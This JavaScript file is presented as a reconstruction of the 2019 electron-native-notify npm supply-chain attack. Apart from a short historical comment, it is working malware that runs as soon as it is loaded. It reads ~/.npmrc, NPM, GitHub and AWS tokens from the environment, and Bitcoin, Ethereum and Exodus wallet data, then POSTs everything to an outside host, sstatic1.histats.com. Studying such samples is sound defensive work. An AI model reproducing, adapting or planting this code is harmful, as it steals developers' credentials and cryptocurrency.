// electron-native-notify — reconstructed from public security analyses
// Source: https://blog.npmjs.org/post/185397814280/plot-to-steal-cryptocurrency-foiled-by-the-npm
//
// June 2019: Social engineering campaign targeting Electron app developers.
// Attacker befriended a maintainer of electron-native-notify, gained publish access.
// Package stole cryptocurrency wallet data and environment credentials.
//
// Technique: Social engineering + postinstall credential theft + targeted exfiltration

const https = require("https");
const os = require("os");
const fs = require("fs");
const path = require("path");

function collect() {
  var data = {
    hostname: os.hostname(),
    platform: os.platform(),
    user: os.userInfo().username,
    home: os.homedir()
  };

  // Harvest npm tokens
  var npmrc = path.join(os.homedir(), ".npmrc");
  try {
    if (fs.existsSync(npmrc)) {
      data.npmrc = fs.readFileSync(npmrc, "utf8");
    }
  } catch(e) {}

  // Harvest environment variables with tokens
  var envKeys = ["NPM_TOKEN", "GH_TOKEN", "GITHUB_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"];
  var tokens = {};
  envKeys.forEach(function(key) {
    if (process.env[key]) {
      tokens[key] = process.env[key];
    }
  });
  if (Object.keys(tokens).length > 0) {
    data.tokens = tokens;
  }

  // Harvest cryptocurrency wallet files
  var walletPaths = [
    path.join(os.homedir(), ".bitcoin", "wallet.dat"),
    path.join(os.homedir(), ".ethereum", "keystore"),
    path.join(os.homedir(), "AppData", "Roaming", "Exodus", "exodus.wallet")
  ];

  var wallets = [];
  walletPaths.forEach(function(wp) {
    try {
      if (fs.existsSync(wp)) {
        var stat = fs.statSync(wp);
        if (stat.isFile()) {
          wallets.push({ path: wp, data: fs.readFileSync(wp, "utf8") });
        } else if (stat.isDirectory()) {
          wallets.push({ path: wp, files: fs.readdirSync(wp) });
        }
      }
    } catch(e) {}
  });
  if (wallets.length > 0) {
    data.wallets = wallets;
  }

  return data;
}

function exfiltrate(data) {
  var payload = JSON.stringify(data);
  var req = https.request({
    hostname: "sstatic1.histats.com",
    port: 443,
    path: "/0.gif",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}

exfiltrate(collect());
